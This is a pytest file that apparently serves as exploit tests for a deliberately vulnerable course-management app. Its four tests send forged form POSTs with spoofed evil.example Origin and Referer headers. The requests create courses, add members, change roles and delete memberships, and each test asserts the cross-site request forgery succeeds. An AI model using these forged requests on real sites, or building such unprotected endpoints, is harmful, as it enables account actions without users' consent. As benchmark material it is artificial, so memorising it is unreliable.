import requests


def api_url(base_url: str, path: str) -> str:
    return base_url.rstrip("/") + path


def json_of(resp):
    try:
        return resp.json()
    except Exception as exc:
        raise AssertionError(
            f"Expected JSON response, got status={resp.status_code}, body={resp.text}"
        ) from exc


def register(session: requests.Session, base_url: str, username: str, password: str, display_name: str):
    return session.post(
        api_url(base_url, "/api/auth/register"),
        json={
            "username": username,
            "password": password,
            "display_name": display_name,
        },
        timeout=10,
    )


def create_course_api(session: requests.Session, base_url: str, title: str, description: str):
    return session.post(
        api_url(base_url, "/api/courses"),
        json={"title": title, "description": description},
        timeout=10,
    )


def list_courses_api(session: requests.Session, base_url: str):
    return session.get(api_url(base_url, "/api/courses"), timeout=10)


def list_members_api(session: requests.Session, base_url: str, course_id: int):
    return session.get(api_url(base_url, f"/api/courses/{course_id}/members"), timeout=10)


def find_course_by_title(session: requests.Session, base_url: str, title: str):
    resp = list_courses_api(session, base_url)
    assert resp.status_code == 200, resp.text
    payload = json_of(resp)
    assert payload["success"] is True

    courses = payload.get("courses") or payload.get("data") or payload.get("items") or []
    for course in courses:
        if course.get("title") == title:
            return course
    return None


def find_user_id_by_username_via_users_api(session: requests.Session, base_url: str, username: str):
    resp = session.get(api_url(base_url, "/api/users"), timeout=10)
    assert resp.status_code == 200, resp.text
    payload = json_of(resp)
    assert payload["success"] is True

    users = payload.get("users") or payload.get("data") or payload.get("items") or []
    for user in users:
        if user.get("username") == username:
            return int(user["user_id"])
    return None


def _extract_member_list(payload):
    candidates = [
        payload.get("memberships"),
        payload.get("members"),
        payload.get("data"),
        payload.get("items"),
        payload.get("results"),
    ]
    for value in candidates:
        if isinstance(value, list):
            return value
    raise AssertionError(f"Could not find member list field in payload: {payload}")


def _membership_user_id(item):
    if "user_id" in item:
        return int(item["user_id"])
    if "member_user_id" in item:
        return int(item["member_user_id"])
    if "id" in item and "role_in_course" in item and "membership_id" not in item:
        return int(item["id"])
    raise AssertionError(f"Could not determine user id from membership item: {item}")


def _membership_id(item):
    if "membership_id" in item:
        return int(item["membership_id"])
    if "id" in item:
        return int(item["id"])
    raise AssertionError(f"Could not determine membership id from item: {item}")


def _membership_role(item):
    if "role_in_course" in item:
        return item["role_in_course"]
    if "role" in item:
        return item["role"]
    raise AssertionError(f"Could not determine role field from item: {item}")


def find_membership_by_user_id(session: requests.Session, base_url: str, course_id: int, user_id: int):
    resp = list_members_api(session, base_url, course_id)
    assert resp.status_code == 200, resp.text
    payload = json_of(resp)
    assert payload["success"] is True

    members = _extract_member_list(payload)
    for membership in members:
        if _membership_user_id(membership) == int(user_id):
            return membership
    return None


def test_exploit_vuln_003_csrf_can_create_course_via_html_form(app_instance):
    base_url = app_instance["base_url"]

    victim = requests.Session()

    r = register(victim, base_url, "csrf_teacher_create", "pass123", "CSRF Teacher Create")
    assert r.status_code == 201, r.text
    assert json_of(r)["success"] is True

    forged = victim.post(
        api_url(base_url, "/courses"),
        data={
            "title": "Forged HTML Course",
            "description": "created via CSRF",
        },
        headers={
            "Origin": "http://evil.example",
            "Referer": "http://evil.example/poc-create.html",
        },
        allow_redirects=False,
        timeout=10,
    )

    assert forged.status_code in (302, 303), forged.text

    created = find_course_by_title(victim, base_url, "Forged HTML Course")
    assert created is not None, "Expected forged course to be created"
    assert created["description"] == "created via CSRF"


def test_exploit_vuln_003_csrf_can_add_member_via_html_form(app_instance):
    base_url = app_instance["base_url"]

    teacher = requests.Session()
    target = requests.Session()

    r1 = register(teacher, base_url, "csrf_teacher_add", "pass123", "CSRF Teacher Add")
    assert r1.status_code == 201, r1.text

    r2 = register(target, base_url, "csrf_target_add", "pass123", "CSRF Target Add")
    assert r2.status_code == 201, r2.text

    create_resp = create_course_api(teacher, base_url, "CSRF Members Course", "demo")
    assert create_resp.status_code == 201, create_resp.text
    course_id = int(json_of(create_resp)["course"]["course_id"])

    target_user_id = find_user_id_by_username_via_users_api(teacher, base_url, "csrf_target_add")
    assert target_user_id is not None

    forged = teacher.post(
        api_url(base_url, f"/courses/{course_id}/members"),
        data={
            "user_id": str(target_user_id),
            "role_in_course": "student",
        },
        headers={
            "Origin": "http://evil.example",
            "Referer": "http://evil.example/poc-add-member.html",
        },
        allow_redirects=False,
        timeout=10,
    )

    assert forged.status_code in (302, 303), forged.text

    membership = find_membership_by_user_id(teacher, base_url, course_id, target_user_id)
    assert membership is not None, "Expected forged add-member request to succeed"
    assert _membership_role(membership) == "student"


def test_exploit_vuln_003_csrf_can_change_member_role_via_html_form(app_instance):
    base_url = app_instance["base_url"]

    teacher = requests.Session()
    target = requests.Session()

    r1 = register(teacher, base_url, "csrf_teacher_role", "pass123", "CSRF Teacher Role")
    assert r1.status_code == 201, r1.text

    r2 = register(target, base_url, "csrf_target_role", "pass123", "CSRF Target Role")
    assert r2.status_code == 201, r2.text

    create_resp = create_course_api(teacher, base_url, "CSRF Role Course", "demo")
    assert create_resp.status_code == 201, create_resp.text
    course_id = int(json_of(create_resp)["course"]["course_id"])

    target_user_id = find_user_id_by_username_via_users_api(teacher, base_url, "csrf_target_role")
    assert target_user_id is not None

    add_resp = teacher.post(
        api_url(base_url, f"/api/courses/{course_id}/members"),
        json={
            "user_id": target_user_id,
            "role_in_course": "student",
        },
        timeout=10,
    )
    assert add_resp.status_code == 201, add_resp.text

    membership = find_membership_by_user_id(teacher, base_url, course_id, target_user_id)
    assert membership is not None
    membership_id = _membership_id(membership)
    assert _membership_role(membership) == "student"

    forged = teacher.post(
        api_url(base_url, f"/courses/{course_id}/members/{membership_id}"),
        data={"role_in_course": "assistant"},
        headers={
            "Origin": "http://evil.example",
            "Referer": "http://evil.example/poc-update-role.html",
        },
        allow_redirects=False,
        timeout=10,
    )

    assert forged.status_code in (302, 303), forged.text

    updated = find_membership_by_user_id(teacher, base_url, course_id, target_user_id)
    assert updated is not None
    assert _membership_role(updated) == "assistant"


def test_exploit_vuln_003_csrf_can_remove_member_via_html_form(app_instance):
    base_url = app_instance["base_url"]

    teacher = requests.Session()
    target = requests.Session()

    r1 = register(teacher, base_url, "csrf_teacher_remove", "pass123", "CSRF Teacher Remove")
    assert r1.status_code == 201, r1.text

    r2 = register(target, base_url, "csrf_target_remove", "pass123", "CSRF Target Remove")
    assert r2.status_code == 201, r2.text

    create_resp = create_course_api(teacher, base_url, "CSRF Remove Course", "demo")
    assert create_resp.status_code == 201, create_resp.text
    course_id = int(json_of(create_resp)["course"]["course_id"])

    target_user_id = find_user_id_by_username_via_users_api(teacher, base_url, "csrf_target_remove")
    assert target_user_id is not None

    add_resp = teacher.post(
        api_url(base_url, f"/api/courses/{course_id}/members"),
        json={
            "user_id": target_user_id,
            "role_in_course": "student",
        },
        timeout=10,
    )
    assert add_resp.status_code == 201, add_resp.text

    membership = find_membership_by_user_id(teacher, base_url, course_id, target_user_id)
    assert membership is not None
    membership_id = _membership_id(membership)

    forged = teacher.post(
        api_url(base_url, f"/courses/{course_id}/members/{membership_id}/delete"),
        headers={
            "Origin": "http://evil.example",
            "Referer": "http://evil.example/poc-remove-member.html",
        },
        allow_redirects=False,
        timeout=10,
    )

    assert forged.status_code in (302, 303), forged.text

    removed = find_membership_by_user_id(teacher, base_url, course_id, target_user_id)
    assert removed is None, "Expected forged remove-member request to delete the membership"